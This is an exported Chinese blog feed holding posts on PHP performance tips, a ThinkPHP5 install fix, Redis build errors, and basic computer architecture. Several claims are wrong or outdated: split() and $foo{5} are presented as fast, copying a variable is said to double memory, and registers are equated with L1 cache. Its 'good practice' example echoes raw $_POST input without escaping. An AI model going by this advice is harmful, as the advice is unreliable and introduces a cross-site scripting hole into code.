<p>使用 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmd6Y29tcHJlc3MucGhw">gzcompress()<i class="fa fa-external-link-alt"></i></span> 和 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmd6dW5jb21wcmVzcy5waHA=">gzuncompress()<i class="fa fa-external-link-alt"></i></span> 对容量大的字符串进行压缩和解压，再<strong>存入和取出数据库</strong>。</p>
<p>这种内置的函数使用gzip算法，能压缩字符串<code>90%</code>。</p>
<p><strong>1.4 echo 输出</strong></p>
<p>echo 字符串用<strong>逗号</strong>代替点连接符更快些。</p>
<p>虽然，<code>echo</code>是一种语言结构，不是真正的函数。</p>
<p>但是，它可以把逗号隔开的多个字符串当作“函数”参数传入，所以速度会更快。</p>
<p>echo $str1, $str2;       &#x2F;&#x2F; 速度快<br>echo $str1 . $str2;      &#x2F;&#x2F; 速度稍慢</p>
<p><strong>1.5 尽量用单引号</strong></p>
<p>PHP 引擎允许使用单引号和双引号来封装字符串变量，但是它们的速度是有很大的差别的！</p>
<p>使用双引号的字符串会告诉 PHP 引擎，首先去读取字符串内容，查找其中的变量，并改为变量对应的值。</p>
<p>一般来说字符串是没有变量的，使用双引号会导致性能不佳。</p>
<p>最好使用字符串连接，而不是双引号字符串。</p>
<p>$output &#x3D; “This is a plain string”;  &#x2F;&#x2F; 不好的实践<br>$output &#x3D; ‘This is a plain string’;  &#x2F;&#x2F; 好的实践</p>
<p>$type &#x3D; “mixed”;                     &#x2F;&#x2F; 不好的实践<br>$output &#x3D; “This is a $type string”;</p>
<p>$type &#x3D; ‘mixed’;                     &#x2F;&#x2F; 好的实践<br>$output &#x3D; ‘This is a ‘ . $type . ‘ string’;</p>
<p><strong>1.6 使用isset代替strlen</strong></p>
<p>在检验字符串长度时，我们第一想法会使用 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnN0cmxlbi5waHA=">strlen()<i class="fa fa-external-link-alt"></i></span> 函数。</p>
<p>此函数执行起来相当快，因为它不做任何计算，只返回在<code>zval</code>结构（C的内置数据结构，用于存储PHP变量）中存储的已知字符串长度。</p>
<p>但是，由于<code>strlen()</code>是函数，多多少少会有些慢，因为函数调用会经过诸多步骤，如字母小写化、哈希查找，会跟随被调用的函数一起执行。</p>
<p>在某些情况下，你可以使用 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmlzc2V0LnBocA==">isset()<i class="fa fa-external-link-alt"></i></span> 技巧加速执行你的代码。例如：</p>
<p>if (strlen($foo) &lt; 5) {<br>    echo “Foo is too short”;<br>}</p>
<p>&#x2F;&#x2F; 使用isset()<br>if (!isset($foo{5})) {<br>    echo “Foo is too short”;<br>}</p>
<p><strong>1.7 用split分割字符串</strong></p>
<p>在分割字符串时，<code>split()</code>要比<code>explode()</code>快。</p>
<p>split()<br>0.001813 - 0.002271 seconds (avg 0.002042 seconds)<br>explode()<br>0.001678 - 0.003626 seconds (avg 0.002652 seconds)</p>
<p><strong>1.8 echo效率高于print</strong></p>
<p>因为<code>echo</code>没有返回值，<code>print</code>返回一个整型。</p>
<p>注意：<code>echo</code>输出大字符串的时候，如果没有调整就会严重影响性能。</p>
<p>打开Apache的<code>mod_deflate</code>进行压缩，或者打开<code>ob_start</code>将内容放进缓冲区，可以改善性能问题。</p>
<h2 id="2-语句"><a href="#2-语句" class="headerlink" title="2 语句"></a>2 语句</h2><p><strong>2.1 最好不用@</strong></p>
<p>用<code>@</code>掩盖错误会降低脚本运行速度，并且在后台有很多额外操作。</p>
<p>用<code>@</code>比起不用，效率差距 3 倍。特别不要在循环中使用<code>@</code>。</p>
<p>在 5 次循环的测试中，即使是先用<code>error_reporting(0)</code>关掉错误，循环完成后再打开，都比用<code>@</code>快。</p>
<p><strong>2.2 避免使用魔术方法</strong></p>
<p>对于<code>__</code>开头的函数就命名为魔术函数，它们都在特定的条件下触发。</p>
<p>这些魔术函数包括：<code>__construct()</code>、<code>__get()</code>、<code>__call()</code>、<code>__autoload()</code>等等。</p>
<p>以<code>__autoload()</code> 为例，如果不能将类名与实际的磁盘文件对应起来，将不得不做大量的文件存在判断。</p>
<p>而判断文件存在需要磁盘I&#x2F;O操作，众所周知，磁盘I&#x2F;O操作的效率很低，因此这才是使得<code>autoload</code>机制效率降低的原因。</p>
<p>因此，在系统设计时，需要定义一套清晰的、将类名与实际磁盘文件映射的机制。</p>
<p>这个规则越简单越明确，<code>__autoload()</code>机制的效率就越高。</p>
<p><code>autoload</code>机制并不是天然的效率低下，只有滥用<code>autoload</code>、设计不好的自动装载函数，才会导致其效率的降低.</p>
<p>所以说，尽量避免使用<code>__autoload</code>等魔术方法，有待商榷。</p>
<p><strong>2.3 别在循环里用函数</strong></p>
<p>例如：</p>
<p>for($x&#x3D;0; $x &lt; count($array); $x++) {<br>}</p>
<p>这种写法在每次循环的时候都会调用 <code>count()</code> 函数，效率大大降低，建议这样：</p>
<p>$len &#x3D; count($array);<br>for($x&#x3D;0; $x &lt; $len; $x++) {<br>}</p>
<p>让函数在循环外面一次获得循环次数。</p>
<p><strong>2.4 使用三元运算符</strong></p>
<p>在简单的判断语句中，三元运算符<code>?:</code>更简洁高效。</p>
<p><strong>2.5 使用选择分支语句</strong></p>
<p><code>switch</code>、<code>case</code>好于使用多个<code>if</code>、<code>else if</code>语句，并且代码更加容易阅读和维护。</p>
<p><strong>2.6 屏蔽敏感信息</strong></p>
<p>使用 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmVycm9yLXJlcG9ydGluZy5waHA=">error_reporting()<i class="fa fa-external-link-alt"></i></span> 函数来预防潜在的敏感信息显示给用户。</p>
<p>理想的错误报告应该被完全禁用在php.ini文件里。</p>
<p>如果用的是共享虚拟主机，php.ini不能修改，最好添加 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmVycm9yLXJlcG9ydGluZy5waHA=">error_reporting()<i class="fa fa-external-link-alt"></i></span> 函数。</p>
<p>放在每个脚本文件的第一行，或者用<code>require_once()</code>来加载，能有效的保护敏感的SQL查询和路径，在出错时不被显示。</p>
<p><strong>2.7 不实用段标签</strong><code>&lt;?</code></p>
<p>不要使用开始标志的缩写形式，你正在使用这样的符号吗<code>&lt;?</code>，应该用完整的<code>&lt;?php</code>开始标签。</p>
<p>当然，如果是输出变量，用<code>&lt;?= $value ?&gt;</code>这种方式是鼓励的，可以是代码更加简洁。</p>
<p><strong>2.8 纯PHP代码不加结束标记</strong></p>
<p>如果文件内容是纯 PHP 代码，最好在文件末尾删除 PHP 结束标记<code>?&gt;</code>。</p>
<p>这可以避免在 PHP 结束标记之后万一意外加入了空格或者换行符，会导致 PHP 开始输出这些空白，而脚本中此时并无输出的意图。</p>
<p><strong>2.9 永远不要使用<code>register_globals</code>和<code>magic quotes</code></strong></p>
<p>这是两个很古老的功能，在当时（十年前）也许是一个好方法，但现在看来并非如此。</p>
<p>老版本的PHP在安装时会默认打开这两个功能，这会引起安全漏洞、编程错误及其他的问题。</p>
<p>如只有用户输入了数据时才会创建变量等。</p>
<p>PHP5.4.0开始这两个功能都被舍弃了，所以每个程序员都应该避免使用。</p>
<p>如果你过去的程序有使用这两项功能，那就尽快将其剔除吧。</p>
<h2 id="3-函数"><a href="#3-函数" class="headerlink" title="3 函数"></a>3 函数</h2><p><strong>3.1 尽量使用PHP内部函数</strong></p>
<p>内置函数使用C语言实现，并且经过PHP官方优化，效率更高。</p>
<p><strong>3.2 使用绝对路径</strong></p>
<p>在<code>include</code>和<code>require</code>中尽量使用绝对路径。</p>
<p>如果包含相对路径，PHP会在<code>include_path</code>里面遍历查找文件。</p>
<p>用绝对路径就会避免此类问题，解析路径所需的时间会更少。</p>
<p><strong>3.3 包含文件</strong></p>
<p>尽量不要用<code>require_once</code>和<code>include_once</code>包含文件，它们多一个判断文件是否被引用的过程，能不用尽量不用。</p>
<p>而使用<code>require</code>、<code>include</code>方法代替。</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5sYXJ1ZW5jZS5jb20vMjAxMi8wOS8xMi8yNzY1Lmh0bWw=">鸟哥在其博客中<i class="fa fa-external-link-alt"></i></span>就多次声明，尽量不要用<code>require_once</code>和<code>include_once</code>。</p>
<p><strong>3.4 函数快于类方法</strong></p>
<p>调用只有一个参数、并且函数体为空的函数，花费的时间等于<code>7-8</code>次<code>$localvar++</code>运算。</p>
<p>而同一功能的类方法大约为15次<code>$localvar++</code>运算。</p>
<p><strong>3.5 用子类方法</strong></p>
<p>基类里面只放能重用的方法，其他功能尽量放在子类中实现，子类里方法的性能优于在基类中。</p>
<p><strong>3.6 类的性能和其方法数量没有关系</strong></p>
<p>新添加10个或多个方法到测试的类后，性能没什么差异。</p>
<p><strong>3.7 读取文件内容</strong></p>
<p>在可以用<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtZ2V0LWNvbnRlbnRzLnBocA==">file_get_contents()<i class="fa fa-external-link-alt"></i></span>替代<code>file()</code>、<code>fopen()</code>、<code>feof()</code>、<code>fgets()</code>等系列方法的情况下，尽量用<code>file_get_contents()</code>。</p>
<p>因为他的效率高得多！</p>
<p><strong>3.8  引用传递参数</strong></p>
<p>通过参数地址引用的方式，实现函数多个返回值，这比按值传递效率高。</p>
<p>方法是在参数变量前加个 <code>&amp;</code>。</p>
<p><strong>3.9 方法不要细分得过多</strong></p>
<p>仔细想想你真正打算重用的是哪些代码？</p>
<p><strong>3.10 尽量静态化</strong></p>
<p>如果一个方法能被静态，那就声明它为静态的，速度可提高<code>1/4</code>，甚至我测试的时候，这个提高了近三倍。</p>
<p>当然了，这个测试方法需要在<strong>十万级</strong>以上次执行，效果才明显。</p>
<p>其实，静态方法和非静态方法的效率主要区别在<strong>内存</strong>。</p>
<p>静态方法在程序开始时生成内存，实例方法（非静态方法）在程序运行中生成内存。</p>
<p>所以，静态方法可以直接调用，实例方法要先成生实例再调用，静态速度很快，但是多了会占内存。</p>
<p>任何语言都是对内存和磁盘的操作，至于是否面向对象，只是软件层的问题，底层都是一样的，只是实现方法不同。</p>
<p>静态内存是连续的，因为是在程序开始时就生成了，而实例方法申请的是离散的空间，所以当然没有静态方法快。</p>
<p>静态方法始终调用同一块内存，其缺点就是不能自动进行销毁，而实例化可以销毁。</p>
<p><strong>3.11 用C扩展方式实现</strong></p>
<p>如果在代码中存在大量耗时的函数，可以考虑用C扩展的方式实现它们。</p>
<h2 id="4-变量"><a href="#4-变量" class="headerlink" title="4 变量"></a>4 变量</h2><p><strong>4.1 及时销毁变量</strong></p>
<p><strong>数组</strong>、<strong>对象</strong>和<strong>GLOBAL变量</strong>在 PHP 中特别占内存的，这个由于 PHP 的底层的zend引擎引起的。</p>
<p>一般来说，PHP数组的内存利用率只有 <code>1/10</code>。</p>
<p>也就是说，一个在C语言里面100M 内存的数组，在PHP里面就要1G。</p>
<p>特别是，在PHP作为后台服务器的系统中，经常会出现内存耗费太大的问题。</p>
<p><strong>4.2 使用$_SERVER变量</strong></p>
<p>如果你需要得到脚本执行的时间，<code>$_SERVER[&#39;REQUSET_TIME&#39;]</code>优于<code>time()</code>。</p>
<p>一个是现成就可以直接用，一个还需要函数得出的结果。</p>
<p><strong>4.3 方法里建立局部变量</strong></p>
<p>在类的方法里建立局部变量速度最快，几乎和在方法里调用局部变量一样快。</p>
<p><strong>4.4 局部变量比全局变量快</strong></p>
<p>由于局部变量是<strong>存在栈中</strong>的。</p>
<p>当一个函数占用的栈空间不是很大的时候，这部分内存很有可能全部命中cache，CPU访问的效率是很高的。</p>
<p>相反，如果一个函数同时使用全局变量和局部变量，当这两段地址相差较大时，cpu cache需要来回切换，效率会下降。</p>
<p><strong>4.5 局部变量而不是对象属性</strong></p>
<p>建立一个对象属性（类里面的变量，例如：<code>$this-&gt;prop++</code>）比局部变量要慢<code>3</code>倍。</p>
<p><strong>4.6 提前声明局部变量</strong></p>
<p>建立一个未声明的局部变量，要比建立一个已经定义过的局部变量慢<code>9-10</code>倍。</p>
<p><strong>4.7 谨慎声明全局变量</strong></p>
<p>声明一个未被任何一个函数使用过的全局变量，也会使性能降低。</p>
<p>这和声明相同数量的局部变量一样，PHP可能去检查这个全局变量是否存在。</p>
<p><strong>4.8 使用</strong><code>++$i</code><strong>递增</strong></p>
<p>当执行变量<code>$i</code>的递增或递减时，<code>$i++</code>会比<code>++$i</code>慢一些。</p>
<p>这种差异是PHP特有的，并不适用于其他语言，所以请不要修改你的C或Java代码，并指望它们能立即变快，没用的。</p>
<p><code>++$i</code>更快是因为它只需要3条指令(opcodes)，<code>$i++</code>则需要4条指令。</p>
<p>后置递增实际上会产生一个临时变量，这个临时变量随后被递增。</p>
<p>而前置递增直接在原值上递增。</p>
<p>这是最优化处理的一种，正如Zend的PHP优化器所作的那样。</p>
<p>牢记，这个优化处理不失为一个好主意，因为不是所有的指令优化器都会做同样的优化处理。</p>
<p><strong>4.9 不要随便复制变量</strong></p>
<p>有时候为了使 PHP 代码更加整洁，一些 PHP 新手（包括我）会把预定义好的变量，复制到一个名字更简短的变量中。</p>
<p>其实这样做的结果是增加了一倍的内存消耗，只会使程序更加慢。</p>
<p>试想一下，在下面的例子中，如果用户恶意插入 <code>512KB</code> 字节的文字，就会导致 1MB 的内存被消耗！</p>
<p>&#x2F;&#x2F; 不好的实践<br>$description &#x3D; $_POST[‘description’];<br>echo $description;</p>
<p>&#x2F;&#x2F; 好的实践<br> echo $_POST[‘description’];</p>
<p><strong>4.10 循环内部不要声明变量</strong></p>
<p>尤其是大变量，这好像不只是PHP里面要注意的问题吧？</p>
<p><strong>4.11 一定要对变量进行初始化</strong></p>
<p>这里的“初始化”指的是“声明”。</p>
<p>当需要没有初始化的变量，PHP解释器会自动创建一个变量，但依靠这个特性来编程并不是一个好主意。</p>
<p>这会造成程序的粗糙，或者使代码变得另人迷惑。</p>
<p>因为你需要探寻这个变量是从哪里开始被创建的。</p>
<p>另外，对一个没有初始化的变量进行递增操作要比初始化过的来得慢。</p>
<p>所以对变量进行初始化会是个不错的主意。</p>
<h2 id="5-数组"><a href="#5-数组" class="headerlink" title="5 数组"></a>5 数组</h2><p><strong>5.1 用字符串而不是数组作为参数</strong></p>
<p>如果一个函数既能接受数组，又能接受简单字符做为参数，那么尽量用字符作为参数。</p>
<p>例如，字符替换函数，参数列表并不是太长，就可以考虑额外写一段替换代码。</p>
<p>使得每次传递参数都是一个字符，而不是接受数组做为查找和替换参数。</p>
<p><strong>5.2 数组元素加引号</strong></p>
<p><code>$row[&#39;id&#39;]</code>比<code>$row[id]</code>速度快7倍。</p>
<p>如果不带引号，例如<code>$a[name]</code>，那么PHP会首先检查有没有<code>define</code>定义的<code>name</code>常量。</p>
<p>如果有，就用这个常量值作为数组键值。如果没有，再查找键值为字符串<code>&#39;name&#39;</code>的数组元素。</p>
<p>多了一个查找判断的过程，所以建议养成数组键名加引号的习惯。</p>
<p>正如上面字符串部分所述，用<code>&#39;</code>又比用<code>&quot;</code>速度更快。</p>
<p><strong>5.3 多维数组操作</strong></p>
<p>多维数组尽量不要循环嵌套赋值。</p>
<p><strong>5.4 循环用foreach</strong></p>
<p>尽量用<code>foreach</code>代替<code>while</code>和<code>for</code>循环，效率更高。</p>
<h2 id="6-架构"><a href="#6-架构" class="headerlink" title="6 架构"></a>6 架构</h2><p><strong>6.1 压缩输出</strong></p>
<p>在php.ini中开启gzip压缩：</p>
<p>zlib.output_compression &#x3D; On<br>zlib.output_compression_level &#x3D; (level)</p>
<p><code>level</code>可能是<code>1-9</code>之间的数字，你可以设置不同的数字。</p>
<p>几乎所有的浏览器都支持Gzip的压缩方式，gzip可以降低<code>80%</code>的输出.</p>
<p>付出的代价是，大概增加了10%的cpu计算量。</p>
<p>但是还是会赚到了，因为带宽减少了，页面加载会变得很快。</p>
<p>如果你使用apache，也可以激活mod_gzip模块。</p>
<p><strong>6.2 静态化页面</strong></p>
<p>Apache&#x2F;Nginx解析一个PHP脚本的时间，要比解析一个静态HTML页面慢<code>2</code>至<code>10</code>倍。</p>
<p>所以尽量使页面静态化，或使用静态HTML页面。</p>
<p><strong>6.3 将PHP升级到最新版</strong></p>
<p>提高性能的最简单的方式是不断升级、更新PHP版本。</p>
<p><strong>6.4 利用PHP的扩展</strong></p>
<p>一直以来，大家都在抱怨PHP内容太过繁杂。</p>
<p>最近几年来，开发人员作出了相应的努力，移除了项目中的一些冗余特征。</p>
<p>即便如此，可用库以及其它扩展的数量还是很可观。</p>
<p>甚至一些开发人员开始考虑实施自己的扩展方案。</p>
<p><strong>6.5 PHP缓存</strong></p>
<p>一般情况下，PHP脚本被PHP引擎编译后执行，会被转换成机器语言，也称为操作码。</p>
<p>如果PHP脚本反复编译得到相同的结果，为什么不完全跳过编译过程呢？</p>
<p>PHP加速器缓存了编译后的机器码，允许代码根据要求立即执行，而不经过繁琐的编译过程。</p>
<p>对PHP开发人员而言，目前提供了两种可用的缓存方案。</p>
<p>一种是APC（Alternative PHP Cache，可选PHP缓存），它是一个可以通过PEAR安装的开源加速器。</p>
<p>另一种流行的方案是OPCode，也就是操作码缓存技术。</p>
<p><strong>6.6 使用NoSQL缓存</strong></p>
<p>Memchached或者Redis都可以。</p>
<p>这些是高性能的分布式内存对象缓存系统，能提高动态网络应用程序性能，减轻数据库的负担。</p>
<p>这对运算码 （OPcode）的缓存也很有用，使得脚本不必为每个请求重新编译。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>Thinkphp5 在 Linux 中的安装问题</title>
    <url>/2018/06/php-thinkphp/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>今天我在测试服务器上，使用 composer 安装 thinkPHP5.0.20 的项目。</p>
<p>安装成功后，配置了一下 vhost.conf ，加了一个重写模式，然后重启 nginx 。</p>
<span id="more"></span>

<p>打开浏览器访问，出现 500 的错误，好郁闷，新装的项目都打不开！</p>
<p>使用 vim 编辑 public&#x2F;index.php 输入端点，调式出现的问题。</p>
<p>发现 require_once () 加载的 TP 类库文件失败，百度了一下，需要改配置文件。</p>
<p>使用 vim 编辑 fastcgi.conf 在 fastcgi_param PHP_ADMIN_VALUE 的属性中，加入当前项目的根目录（例如：&#x2F;home&#x2F;wwwroot&#x2F;example）。</p>
<p>打浏览器，正常访问，问题解决！</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>Redis 安装异常解决办法</title>
    <url>/2018/06/redis-install/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>官网地址：<span class="exturl" data-url="aHR0cDovL3JlZGlzLmlvLw==">http://redis.io/<i class="fa fa-external-link-alt"></i></span></p>
<p>官网下载地址：<span class="exturl" data-url="aHR0cDovL3JlZGlzLmlvL2Rvd25sb2Fk">http://redis.io/download<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>

<ol>
<li><p>下载 Redis 源码（tar.gz），并上传到 Linux</p>
</li>
<li><p>解压缩包：<code>$ tar zxvf redis-2.8.17.tar.gz</code></p>
</li>
<li><p>进入解压缩后的文件夹：<code>$ cd redis-2.8.17</code></p>
</li>
<li><p>编译源码：make</p>
</li>
</ol>
<p>（1）若出现如下提示，则说明未安装 gcc，使用命令安装 gcc <code>$ yum install gcc</code></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">[root@localhost redis-<span class="number">2.8</span>.<span class="number">17</span>]# <span class="keyword">make</span></span><br><span class="line"><span class="keyword">cd</span> src &amp;&amp; <span class="keyword">make</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Entering directory `/root/redis-<span class="number">2.8</span>.<span class="number">17</span>/src‘</span><br><span class="line">    CC adlist.<span class="keyword">o</span></span><br><span class="line">/bin/<span class="keyword">sh</span>: <span class="keyword">cc</span>: <span class="keyword">command</span> not found</span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: *** [adlist.<span class="keyword">o</span>] Error <span class="number">127</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Leaving directory `/root/redis-<span class="number">2.8</span>.<span class="number">17</span>/src‘</span><br><span class="line"><span class="keyword">make</span>: *** [<span class="keyword">all</span>] Error <span class="number">2</span></span><br><span class="line">（<span class="number">2</span>）若出现如下提示，则将 <span class="keyword">make</span> 改为 <span class="keyword">make</span> MALLOC=libc，推测是因为编译库的问题。</span><br><span class="line"></span><br><span class="line">[root@localhost redis-<span class="number">2.8</span>.<span class="number">17</span>]# <span class="keyword">make</span></span><br><span class="line"><span class="keyword">cd</span> src &amp;&amp; <span class="keyword">make</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Entering directory `/root/redis-<span class="number">2.8</span>.<span class="number">17</span>/src‘</span><br><span class="line">    CC adlist.<span class="keyword">o</span></span><br><span class="line">In <span class="keyword">file</span> included from adlist.<span class="keyword">c</span>:<span class="number">34</span>:</span><br><span class="line">zmalloc.h:<span class="number">50</span>:<span class="number">31</span>: error: jemalloc/jemalloc.h: No such <span class="keyword">file</span> <span class="built_in">or</span> directory</span><br><span class="line">zmalloc.h:<span class="number">55</span>:<span class="number">2</span>: error: #error <span class="string">&quot;Newer version of jemalloc required&quot;</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: *** [adlist.<span class="keyword">o</span>] Error <span class="number">1</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Leaving directory `/root/redis-<span class="number">2.8</span>.<span class="number">17</span>/src‘</span><br><span class="line"><span class="keyword">make</span>: *** [<span class="keyword">all</span>] Error <span class="number">2</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li><p>安装编译后的文件 <code>$ make install</code>，redis 可执行文件将被复制到 <code>/usr/local/bin/</code>，但没有配置，手动复制配置 <code>$ cp redis.conf/usr/local/bin</code></p>
</li>
<li><p>设置 Redis 密码，编辑刚刚复制的配置文件：<code>$ vi redis.conf</code>，解除 requirepass 参数的注释，并设置值，例如：requirepass foobar</p>
</li>
<li><p>使用配置文件启动 Redis 数据库：<code>$ ./redis-server redis.conf</code></p>
</li>
</ol>
<p>恭喜你，Redis 已安装成功。</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
  </entry>
  <entry>
    <title>编程语言的作用及与操作系统和硬件的关系</title>
    <url>/2018/06/software-hardware/</url>
    <content><![CDATA[<h2 id="一、编程语言的作用及与操作系统和硬件的关系"><a href="#一、编程语言的作用及与操作系统和硬件的关系" class="headerlink" title="一、编程语言的作用及与操作系统和硬件的关系"></a>一、编程语言的作用及与操作系统和硬件的关系</h2><pre><code>作用：编程语言是计算机语言，是一种程序员与计算机之间沟通的介质，通过编程语言可以使得计算机能够根据人的指令一步一步去工作，完成某种特定的任务。

关系：编程语言会通过编译软件写成程序，程序是不能直接和硬件来进行交互的，而操作系统是用来管理计算机硬件设备的，所以我们可以就可以在操作系统上来运行程序，让操作系统去管理与配置内存、决定系统资源供需的优先次序、控制输入与输出、操作网络与管理文件系统等基本任务。
</code></pre>
<span id="more"></span>

<h2 id="二、应用程序、操作系统、硬件之间的关系"><a href="#二、应用程序、操作系统、硬件之间的关系" class="headerlink" title="二、应用程序、操作系统、硬件之间的关系"></a>二、应用程序、操作系统、硬件之间的关系</h2><pre><code>硬件上运行操作系统，操作系统上运行应用程序，应用程序通过 Windows API 调用操作系统函数从而和计算机硬件交互。
</code></pre>
<h2 id="三、cpu、内存、磁盘之间的关系"><a href="#三、cpu、内存、磁盘之间的关系" class="headerlink" title="三、cpu、内存、磁盘之间的关系"></a>三、cpu、内存、磁盘之间的关系</h2><ol>
<li><p>CPU 即中央处理器，CPU 从内存或缓存中取出指令，放入指令寄存器，并对指令进行解码，然后发出各种控制命令，从而完成一条指令的执行。</p>
</li>
<li><p>CPU 并不能直接调用存储在硬盘上的系统、程序和数据，必须将硬盘的有关内容通过总线存储在内存中，才能被 CPU 读取运行。因而，内存可以理解为硬盘和 CPU 的 “中转站”。</p>
</li>
<li><p>当运行数据大小超出物理内存的时候，这时系统就会将硬盘上的部分空间模拟成内存 —— 虚拟内存，并将暂时不运行的程序或不使用的数据存放到这部分空间之中，等待需要的时候方便及时调用。</p>
</li>
<li><p>内存是带电储存，断电消失，并且容量有限，如果想长期储存的话还需要将数据存放到硬盘中。</p>
</li>
</ol>
<h2 id="四、cpu-与寄存器，内核态与用户态及如何切换"><a href="#四、cpu-与寄存器，内核态与用户态及如何切换" class="headerlink" title="四、cpu 与寄存器，内核态与用户态及如何切换"></a>四、cpu 与寄存器，内核态与用户态及如何切换</h2><ol>
<li><p>寄存器是 cpu 的一部分，因为 cpu 从内存得到指令或数据的时间比 cpu 执行指令花费的时间要长，所以将关键变量和临时数据保存到寄存器里面，访问速度和 CPU 同速或半速，用来避免内存速率比 CPU 慢几个数量级的瓶颈问题，寄存器的分类：</p>
<p>  a. 通用寄存器：用来保存 cpu 运行中产生的变量和临时结果。</p>
<p>  b. 程序计数器：cpu 只能同时做一件事情，所以在运行过程中会在多个指令中来回切换执行，程序计数器用来存放这些指令的状态。</p>
<p>  c. 堆栈指针：堆栈指针的的作用是在堆栈过程中始终指向栈顶，取出指令，然后 cpu 去运行。栈就是先进后出的一种数据结构。</p>
<p>  d. 程序状态字寄存器：无论是系统软件还是应用软件执行后都得转换成 cpu 的指令，状态字寄存器用来控制用户态和内核态两种状态。</p>
</li>
<li><p>当 cpu 可以访问内存里的所有数据，并且可以访问外围设备（硬盘，网卡等硬件）时为内核态，CPU 也可以将自己从一个程序切换到另一个程序；受限的访问内存，且不允许访问外围设备时为用户态，占用 CPU 的能力被剥夺，CPU 资源可以被其他程序获取。</p>
</li>
<li><p>所有用户程序都是运行在用户态的，但是有时候程序确实需要做一些内核态的事情，例如从硬盘读取数据， 或者从键盘获取输入等。 而唯一可以做这些事情的就是操作系统， 所以此时用户程序就需要使用系统调用，操作系统请求以程序的名义来执行这些操作，此时就会从用户态切换到内核态。</p>
</li>
</ol>
<h2 id="五、L1-缓存，L2-缓存，内存（RAM），EEPROM-和闪存，CMOS-与-BIOS-电池"><a href="#五、L1-缓存，L2-缓存，内存（RAM），EEPROM-和闪存，CMOS-与-BIOS-电池" class="headerlink" title="五、L1 缓存，L2 缓存，内存（RAM），EEPROM 和闪存，CMOS 与 BIOS 电池"></a>五、L1 缓存，L2 缓存，内存（RAM），EEPROM 和闪存，CMOS 与 BIOS 电池</h2><ol>
<li><p>寄存器既 L1 缓存，材质、速度和 CPU 相同，CPU 访问寄存器时无延时。</p>
</li>
<li><p>L2 缓存被称为告诉缓存，CPU 比较常用的会放在 L2 缓存中，访问速度会比 L1 缓存慢。</p>
</li>
<li><p>所有的程序都是在内存中运行的，计算机在运行中，操作系统也会在内存中运行。内存的速度会慢于 L1 和 L2 缓存，CPU 访问的先后顺序是先访问 L1 缓存吗，然后访问 L2 缓存，再访问内存，最后访问硬盘，每次访问的命中率为 80%。</p>
</li>
<li><p>EEPROM 和闪存都是一种储存器，可以擦除和重写，但是重写的速度介于内存和磁盘之间。被应用于便携式电子设备的存储媒介，磁盘，固态硬盘等，都是应用闪存。</p>
</li>
</ol>
<p>5.CMOS 也是一类存储介质，它是易失性的，断电既消失，但是因为它的耗电亮很小，所以采用它来存储一些系统的参数配置，一块电池能使用若干年。</p>
<h2 id="六、平均寻道时间，平均延迟时间，虚拟内存与-MMU"><a href="#六、平均寻道时间，平均延迟时间，虚拟内存与-MMU" class="headerlink" title="六、平均寻道时间，平均延迟时间，虚拟内存与 MMU"></a>六、平均寻道时间，平均延迟时间，虚拟内存与 MMU</h2><ol>
<li><p>平均寻道时间它是指硬盘在接收到系统指令后，磁头从开始移动到移动至数据所在的磁道所花费时间的平均值。</p>
</li>
<li><p>平均延迟时间机械臂到达正确的磁道之后，使得要读取的扇区转到读写头的下方这段时间的平均值，为平均延迟时间。</p>
</li>
<li><p>当计算机运行大小大于物理内存的程序时，会在硬盘中分块一块空间，然后将内存中程序不常用的数据放到硬盘的那块空间中，当用到的时候在拿回到内存中，这时内存和虚拟的内存空间会形成映射，成为存储器管理单元（MMU）。这种方式的运行速度会比正常情况下低。</p>
</li>
</ol>
<h2 id="七、磁带"><a href="#七、磁带" class="headerlink" title="七、磁带"></a>七、磁带</h2><p>速度低于磁盘，但是因其大容量，在地震水灾火灾时可移动性强等特性，常被用来做备份。</p>
<h2 id="八、设备驱动与控制器"><a href="#八、设备驱动与控制器" class="headerlink" title="八、设备驱动与控制器"></a>八、设备驱动与控制器</h2><ol>
<li><p>控制器是计算机中的一个实体设备，实现 I&#x2F;O 设备和计算机之间的数据交换，它是 CPU 与 I&#x2F;O 设备之间的接口，它接收从 CPU 发来的命令，并去控制 I&#x2F;O 设备工作，以使处理机从繁杂的设备控制事务中解脱出来。</p>
</li>
<li><p>设备驱动是操作系统和输入输出设备间的粘合剂。驱动负责将操作系统的请求传输，转化为特定物理设备控制器能够理解的命令。</p>
</li>
</ol>
<h2 id="九、总线与南桥和北桥"><a href="#九、总线与南桥和北桥" class="headerlink" title="九、总线与南桥和北桥"></a>九、总线与南桥和北桥</h2><ol>
<li><p>总线将计算机内部各部件连接，并且实现了计算机各功能部件之间的信息传输。</p>
</li>
<li><p>南桥连接慢速设备，硬盘，显示器等设备。</p>
</li>
<li><p>北桥连接高速设备，CPU，内存等设备。</p>
</li>
</ol>
